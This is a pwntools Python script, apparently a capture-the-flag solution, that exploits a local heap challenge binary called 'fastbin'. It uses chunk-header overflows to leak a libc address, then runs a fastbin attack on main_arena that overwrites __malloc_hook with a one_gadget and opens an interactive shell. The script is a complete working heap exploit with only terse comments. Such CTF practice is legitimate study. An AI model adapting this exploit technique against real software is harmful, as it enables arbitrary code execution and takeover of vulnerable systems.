from pwn import *

context.log_level = "debug"

p = process("./fastbin")


def allocate(size, ):

    p.sendline("1")
    print p.recv()
    p.sendline(str(size))
    print p.recv()

def fill(index, size, content):

    p.sendline("2")
    print p.recv()
    p.sendline(index)
    print p.recv()
    p.sendline(str(size))
    print p.recv()
    p.send(content)
    print p.recv()

def free(index):

    p.sendline("3")
    print p.recv()
    p.sendline(index)
    print p.recv()

def dump(index):

    p.sendline("4")
    print p.recv()
    p.sendline(index)
    return p.recv()


#first , fastbin attack is still available,
#Second, we need more information.
#Try to leak heap & libc.

#leak libc.

allocate(0x50) #0
allocate(0x50) #1
allocate(0x50) #2
allocate(0x50) #3

fill("0", 96, "a"*80+p64(0x0)+p64(0xc1))
free("1")
allocate(0x80) #1
data = dump("2")
libc = u64(data.split("\n")[1][:6].ljust(0x8,"\x00")) - 0x3c4b78
print hex(libc)
allocate(0x50) #4

allocate(0x50) #5
allocate(0x50) #6
allocate(0x50) #7
allocate(0x50) #8
allocate(0x30) #9
allocate(0x30) #10
allocate(0x30) #11
allocate(0x30) #12

free("5")
free("7")
fill("6", 104, "a"*80 + p64(0x0) + p64(0x61)+p64(0x41))
allocate(0x50) #5
free("9")
free("11")
arena_fast = libc + 0x3c4b40
top_fake = libc + 0x3c4aed
malloc_hook= libc + 0x3c4b10
one_gadget = libc + 0x4526a
fill("10", 72, "a"*48 + p64(0) + p64(0x41) + p64(arena_fast))
allocate(0x30) #7
allocate(0x30) #9
fill("9",0x30,"a"*40 + p64(top_fake))
allocate(0x30) #11
fill("11", 0x20, "a"*19 + p64(one_gadget)+"a"*5)
p.sendline("1")
p.recv()
p.sendline("20")
p.interactive()


